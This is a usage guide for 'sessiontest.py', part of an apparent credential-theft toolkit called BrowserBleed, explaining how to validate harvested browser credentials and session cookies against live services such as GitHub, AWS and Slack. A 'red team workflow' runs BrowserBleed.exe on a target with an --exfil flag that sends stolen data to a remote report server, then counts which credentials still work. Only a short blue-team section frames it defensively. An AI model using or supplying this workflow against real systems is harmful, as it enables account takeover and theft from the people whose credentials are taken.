BrowserBleed Guide Payloads Extension

sessiontest.py — Credential Validation

Test extracted credentials and cookies against live services

Quick Start

After exporting a BrowserBleed report from the server:

# Simplest — auto-finds latest ZIP in ~/Downloads
python3 sessiontest.py

# With browser sessions (opens Playwright)
python3 sessiontest.py --browser

# JSON output for parsing
python3 sessiontest.py --json
✓ Auto-detection: sessiontest.py automatically finds the most recent BrowserBleed report ZIP in your Downloads folder, extracts the CSV, and runs validation. No manual steps needed.

What It Does

sessiontest.py makes live API requests to validate each extracted credential:

  • Tests credentials against the actual service (GitHub, Google, Anthropic, AWS, Slack, etc.)
  • Reports identity — which user/account owns the credential
  • Shows access — what permissions or scopes the credential grants
  • Tests cookies — validates session cookies via redirect-check

Usage Examples

Basic usage (auto-detect)

python3 sessiontest.py

Searches for the most recent report ZIP in ~/Downloads, extracts it, and tests all credentials.

Explicit CSV file

python3 sessiontest.py /path/to/bb_results.csv

With browser testing

python3 sessiontest.py --browser

Opens a Playwright browser to interactively test cookie sessions. Requires: pip install playwright && playwright install chromium

JSON output

python3 sessiontest.py --json

Machine-readable output with full API responses for each credential.

Adjust timeout and delay

python3 sessiontest.py --timeout 15 --delay 0.5

Increase timeout to 15 seconds, delay between requests to 0.5 seconds (default: 10s timeout, 0.3s delay).

Skip TLS verification

python3 sessiontest.py --no-verify-ssl

Combine flags

python3 sessiontest.py --browser --json --timeout 20

Auto-Detection Priority

When no file is specified, sessiontest searches in this order:

  1. BB_RESULTS_CSV environment variable (if set)
  2. Most recent *_YYYY-MM-DD.csv in ~/Downloads
  3. bb_results.csv in current directory
  4. bb_results.csv in script directory
  5. Most recent *_YYYY-MM-DD.zip in ~/Downloads (auto-extracts)

Environment Variables

VariablePurpose
BB_RESULTS_CSVExplicit path to CSV file (highest priority)
BB_QUIETSuppress auto-extraction messages
Example: 
export BB_RESULTS_CSV=/tmp/results.csv
python3 sessiontest.py

# Suppress output
export BB_QUIET=1
python3 sessiontest.py

Output Modes

Default (human-readable table)

Colored status indicators, truncated values, summary counts:

  • ✓ valid — credential works
  • ⏱ expired — token/session expired
  • ✗ invalid — credential rejected (401/403)
  • ! error — connection/parsing error
  • · info — inconclusive (may or may not be valid)

JSON output

Machine-readable with full API responses for parsing:

{
  "service": "GitHub",
  "label": "GitHub token",
  "status": "valid",
  "identity": "andrew (andrewhannaford)",
  "access": "5 public repos  private repos ✓  orgs: my-org"
}

Common Workflows

Red team workflow

# 1. Run BrowserBleed on target
./BrowserBleed.exe --exfil https://reports.yourdomain.com --exfil-key KEY

# 2. Download report from server (saves as ZIP to ~/Downloads)
# 3. Run validation on your machine
python3 sessiontest.py --json > results.json

# 4. Parse results for live credentials
grep '"status": "valid"' results.json | wc -l

Blue team / detection testing

# Test with your own valid tokens to understand the tool
echo "ghp_YOURTOKEN" > test.csv
sessiontest.py test.csv --timeout 30
